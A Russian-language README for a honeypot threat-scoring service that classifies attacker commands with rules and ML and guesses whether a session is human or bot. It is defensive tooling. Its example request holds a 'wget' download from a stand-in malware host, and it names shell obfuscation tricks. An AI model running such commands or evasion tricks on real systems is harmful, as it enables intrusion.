# HoneyMind — AI-аналитика HoneyForge

Микросервис, который читает действия атакующего в ловушке (команда, вход по паролю, загрузка файла)
и возвращает **оценку опасности 0–100**, **класс действия** и объяснение — для панели, алертов и Telegram.

```json
POST /predict   {"event_type": "command_executed", "payload": {"command": "wget http://malware.com/virus.sh"}}
→ {"threat_score": 95, "category": "malware_downloader", "is_human": null, "confidence": 1.0,
   "needs_review": false, "matched_rules": ["dl_and_exec", "dl_with_url"], "mitre": ["T1059.004", "T1105"],
   "summary": "Загрузка вредоноса, оценка 95/100. Основание: загрузка и запуск файла; загрузка файла по сети."}
```

Три обязательных поля контракта — `threat_score`, `category`, `is_human`. Остальное — бонус для панели.

## Быстрый старт

```bash
pip install -r requirements.txt
python train.py                      # ~6 с, создаёт models/honeymind.joblib (+ .sha256)
# models/human.json (модель «человек/бот») уже в архиве; переобучение — см. раздел is_human
python main.py                       # http://127.0.0.1:8001  (docs: /docs)
# или:  uvicorn main:app --host 0.0.0.0 --port 8001
```

Docker (модель команд обучается при сборке — версии scikit-learn всегда совпадают; модель is_human — готовый JSON):

```bash
docker build -t honeyforge-honeymind .
docker run --rm -p 8001:8001 -e HONEYMIND_TOKEN=change-me honeyforge-honeymind
```

Для compose — без публикации порта наружу (сервис нужен только бэкенду):

```yaml
  honeymind:
    build: ./honeymind
    environment: { HONEYMIND_TOKEN: "${HONEYMIND_TOKEN}", HONEYMIND_DOCS: "0" }
    networks: [backend]          # порт НЕ публикуем
```

Тесты: `pip install -r requirements-dev.txt && pytest` (74 теста, ~10 с).
> Dockerfile проверен по шагам вручную (копирование файлов → `train.py` → `uvicorn main:app`), но сам `docker build` в среде разработки не запускался — там не было демона Docker.

## API

| Метод | Путь | Что делает |
|---|---|---|
| POST | `/predict` | одно событие → вердикт (**основной контракт**) |
| POST | `/predict/batch` | `{"events":[…]}`, до 200 событий |
| POST | `/session` | `{"events":[…]}`, до 500 событий одной сессии → оценка сессии + `is_human` |
| GET | `/health` | статус, загружена ли модель (без авторизации) |

**Принимает любую из схем событий** (в проекте их сейчас три разных + Cowrie):

* строка таблицы Ростика: `{"event_type": "command_executed|ssh_login_attempt|malware_download", "payload": {…} | "<json-строка>", "timestamp": …}`
* «голый» payload: `{"command": …}` / `{"username": …, "password": …}` / `{"url": …, "file_hash": …}`
* `Event` центра (`type`: `command`, `auth_attempt`, `payload`, `honeytoken`, `http_request`, `connect`, `session_end`)
* Cowrie (`eventid`: `cowrie.command.input`, `cowrie.login.*`, `cowrie.session.file_download` …)

**Переменные окружения:** `HONEYMIND_TOKEN` (если задан — нужен `Authorization: Bearer …`), `HONEYMIND_MODEL` (путь к модели),
`HONEYMIND_DOCS=0` (спрятать `/docs`), `HONEYMIND_MAX_BODY` (байт, по умолчанию 65536).
Нет файла модели или не сошлась контрольная сумма → сервис **не падает**, а работает на одних правилах (`/health` покажет `model_loaded:false`).

### Поля ответа

| Поле | Смысл |
|---|---|
| `threat_score` | 0–100. **≥ 60 — «опасно»** (порог для алертов) |
| `category` | `benign`, `reconnaissance`, `privilege_escalation`, `defense_evasion`, `network_scan`, `persistence`, `credential_access`, `malware_execution`, `cryptominer`, `destructive`, `malware_downloader`, `reverse_shell`; для входов по паролю — `credential_attempt`; `unknown` — нечем оценить |
| `is_human` | `true/false/null`. **По одному событию определить нельзя → `null`.** Считается в `/session` по цепочке событий (раздел «is_human» ниже) |
| `confidence` | уверенность решения (для правил ~0.9–1.0, для ML — вероятность класса) |
| `needs_review` | `true` — система сама не уверена, нужен взгляд человека |
| `source` | `rules` / `model` / `hybrid` / `heuristic` |
| `matched_rules`, `mitre` | какие правила сработали и к каким техникам MITRE ATT&CK это относится |
| `summary` | готовая фраза для панели/Telegram. **В неё не попадает ни байта из команды атакующего** |

## Как принимается решение

```
команда → нормализация (деобфускация: w''get, ${IFS}, base64 | sh, \x-escapes; обрезка до 4 КБ)
       ├─ правила (линейные регулярки, объяснимые, дают «пол» оценки)         ┐
       └─ ML: TF-IDF (символьные 2–5-граммы + слова) → LogisticRegression    ┘→ гибрид
```

* Сработало правило → категория от правила; модель может **поднять** балл, но не больше чем на 25 пунктов
  (иначе безобидная чистка файлов превращалась в «destructive» из-за слова `rm -rf`).
* Правил нет → решает модель. «Опасно» (≥ 60) только по модели объявляется лишь при уверенности ≥ 0.7, иначе балл ограничивается 59 и ставится `needs_review`.
  Для одно-двухсловных команд без правил балл ограничен 40: у ML слишком мало материала.
* `threat_score` модели = Σ P(класс)·тяжесть(класс), поэтому плавный, а не «ровно 95».
* RandomForest — заменяемая опция (`python train.py --kind rf`); в групповой CV на синтетике LogReg лучше (0.81 против 0.76), поэтому по умолчанию он.

## is_human — «человек или бот» по сессии

`POST /session {"events": [...строки таблицы одной сессии...]}` возвращает, кроме оценки угрозы:

| Поле | Смысл |
|---|---|
| `is_human` | `true` — похоже на человека (только при высокой уверенности и ≥ 3 командах); `false` — бот; `null` — не знаем |
| `human_probability` | вероятность «человек» по модели (0–1) или `null`, если событий < 4 |
| `human_method` | кто решил: `model`, `rules` (типовые пробы ботнетов), `script_tracker` (этот же сценарий уже приходил с других IP), `heuristic` (модели нет) |
| `human_reason` | почему — 3 главных признака по-русски; **текст атакующего сюда не попадает** |
| `script_seen_before` | сколько других сессий уже присылали тот же сценарий команд |

**Как устроено.** Логистическая регрессия на 23 признаках сессии, у каждого понятный смысл: паузы между действиями
(человеку нужно подумать и набрать), насколько паузы одинаковые (у «вежливого» бота почти равные), длинные команды
набираются дольше, опечатки с исправлением, хождение по папкам `cd/ls`, интерактивные программы (`vi`, `top`, `man`),
склейка команд через `;`/`&&`, типовые пробы ботнетов. Модель хранится **числами в JSON** (`models/human.json`), без pickle.
Поверх модели — два правила: типовой скрипт ботнета → бот; та же последовательность команд уже была в ≥ 2 сессиях с ≥ 2 других IP → бот
(в реальных логах из 27 492 сессий с ≥ 4 командами только 59 имели уникальную последовательность).

**Откуда данные.** Людей в публичных логах практически нет (просмотрено ≈ 338 тыс. сессий, нашлась одна похожая на человека),
поэтому **люди — симуляция** (`honeymind/simulate.py`: «подумать» + «набрать» + опечатки + разные стили), **боты — настоящие** сессии Cowrie
плюс синтетические трудные случаи. Результаты — в [EVALUATION.md, раздел 5](EVALUATION.md). Коротко:
на реальных ботах (176 сессий, 87 сценариев, не участвовали в обучении) **ни одного ложного «человека»** (старая эвристика — 7,4 %);
единственную реальную сессию, похожую на человека, модель называет человеком (p = 0.92). На людях модель **проверена только на симуляции.**

**Переобучение и проверка на ваших данных:**

```bash
python scripts/extract_sessions.py data/real_bot_sessions.jsonl.gz cowrie.json*   # реальные боты из логов Cowrie
python train_human.py                                                            # ~7 с → models/human.json + reports/human_eval.json
python scripts/eval_sessions.py my_labeled.jsonl                                 # {"label": "human"|"bot", "events": [...]}
```

**Самое полезное, что может сделать команда:** каждый 2–3 раза зайти на свой honeypot и «поиграть в хакера» руками
(осмотреться, походить по папкам, что-то скачать), плюс прогнать пару своих скриптов (например, `hydra` и цикл с `ssh … 'uname -a; …'`).
Выгрузить эти сессии из БД, подписать `human`/`bot` и прогнать `scripts/eval_sessions.py`. Это даст первую **настоящую** проверку ветки «человек».

## Как встроить в бэкенд (рекомендации для Ростика / Даниэля)

1. **Приём событий не должен ждать HoneyMind.** Вызывайте сервис асинхронно с таймаутом ~300–500 мс (типичный ответ — 4 мс);
   при ошибке/таймауте сохраняйте событие с `threat_score = NULL` и дооценивайте фоном. Падение ML не должно ронять ловушки.
2. Сервис держите **только во внутренней сети docker**, порт наружу не публиковать, задать `HONEYMIND_TOKEN`.
3. В БД достаточно полей: `threat_score int`, `category text`, `needs_review bool` + весь ответ в JSON (`matched_rules`, `mitre`, `summary`).
4. Алерты: `threat_score ≥ 60` → алерт; `needs_review` → отдельная очередь «на разбор».
5. `is_human`: для живой оценки — вызывайте `/session` при `session_end` (или раз в N секунд по активным сессиям).
6. Пример вызова (httpx):

```python
async with httpx.AsyncClient(base_url="http://honeymind:8001", timeout=0.4,
                             headers={"Authorization": f"Bearer {TOKEN}"}) as c:
    try:
        v = (await c.post("/predict", json={"event_type": row.event_type, "payload": row.payload})).json()
    except httpx.HTTPError:
        v = None          # сохраняем без оценки, дооценим позже
```

## Данные и обучение — честно

* **Публичные логи Cowrie не размечены** (нет поля «опасно/нет»), поэтому обучающий корпус (`honeymind/corpus.py`) — **синтетический**:
  ~1600 команд из шаблонов типовых действий ботнетов (загрузчики, SSH-key-инжекторы, майнеры, reverse shell и т. д.).
  Метка = класс шаблона. Корпус написан тем же человеком, что и правила → на нём качество завышено; поэтому оценка делается на реальных данных.
* **Реальные данные** использовались для оценки и для исправления найденных ошибок: суточный дамп CyberLab honeynet (Zenodo 10.5281/zenodo.3687527)
  и два набора логов Cowrie с GitHub (≈5,1 млн событий; вместе ≈3,7 тыс. уникальных команд). Сами дампы в архив не включены.
  Конвертер в формат таблицы Ростика: `python scripts/extract_cowrie.py -o ml_dataset.csv cowrie.json cowrie.json.1.gz`.
* Результаты и методика — в **[EVALUATION.md](EVALUATION.md)**. Коротко: на свежей слепой выборке из реальных команд (n=53, после всех правок)
  точность по классам **85 % (95 % ДИ 73–92 %)**, «опасно/нет» — precision 0.94, recall 0.85. Выборка маленькая, размечал один человек.

## Ограничения (читать обязательно)

1. **Реальных данных мало на редкие классы.** В логах нет заметных `reverse_shell`, `cryptominer`, `destructive`, `credential_access`, `network_scan`:
   для них проверена только синтетика и тесты. В реальном трафике эти классы встречались лишь как ложные срабатывания на мусоре — порог ≥ 60 + `needs_review` как раз для этого.
2. **Обучено на трафике IoT-ботнетов в чужих ловушках.** Другой набор приманок/ОС в HoneyForge и живые операторы дадут другое распределение.
3. **Метки — мнение одного разметчика** (политика в EVALUATION.md); граничные случаи (пробы записи, сборка скрипта по строкам) спорные.
4. `is_human`: модель обучена на **симулированных людях**; на реальных людях не проверена (их в данных нет, кроме одной сессии).
   Она знает только тех людей, которых мы смогли описать: «человек нового типа», не попавший в обучение, распознавался в ~54 % случаев.
   **Бот, специально подражающий человеку** (паузы + `cd/ls`), обманывает её в ~28 % случаев — признаки поведенческие, их можно подделать.
   Без файла `models/human.json` сервис возвращается к старой эвристике по темпу.
5. Оценка входа по паролю (`credential_attempt`) — простая эвристика (типовая пара из ботнет-словарей → 15, нетипичная → 28, успешный вход +10), не ML.
6. HTTP-события (`http_request`) оцениваются тем же shell-движком и всегда получают `needs_review`: веб-атаки (SQLi, LFI) не покрыты.
7. Модель — pickle. Загрузка проверяет SHA-256 из `honeymind.joblib.sha256`, но это защита от подмены файла, не от того, кто может писать в обе. Держите модель в read-only слое образа (в Dockerfile так и сделано).

## Безопасность

* Входные поля контролирует атакующий: всё приводится к строке и обрезается (4 КБ на поле, 64 КБ на тело, 200/500 событий в пакете).
* Регулярки линейные, есть тесты на «злые» входы (каждый разбирается < 0,5 с).
* Сводка (`summary`) строится из шаблонов и не содержит текста атакующего → безопасно показывать в панели, Telegram или подавать в LLM (иначе — канал prompt injection).
* ML-классификатор не интерпретирует текст как инструкции, поэтому prompt injection на него неприменим; но его можно «обманывать» подбором команд — не используйте оценку как единственный барьер.
* Логи сервиса не содержат тексты команд (только тип, класс, балл, время).
